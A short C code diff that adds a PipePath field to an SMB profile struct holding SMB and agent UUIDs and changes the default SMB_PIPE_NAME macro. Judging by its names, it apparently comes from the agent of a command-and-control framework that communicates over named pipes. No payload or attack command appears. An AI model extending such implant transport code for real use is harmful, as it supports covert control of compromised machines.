@@ -26,7 +26,8 @@ typedef struct {
 struct _SMB_PROFILE_DATA {
     CHAR* SmbUUID;
     CHAR* AgentUUID;
-    
+    CHAR* PipePath;
+
     HANDLE Handle;
 
     PACKAGE* Pkg;
@@ -199,7 +200,7 @@ struct HTTP_CONTEXT {
 /* ============ [ smb profile ] ============ */
 
 #ifndef SMB_PIPE_NAME
-#define SMB_PIPE_NAME L""
+#define SMB_PIPE_NAME { 0x00 }
 #endif // SMB_PIPE_NAME
 
 /* ============ [ http basic config ] ============ */
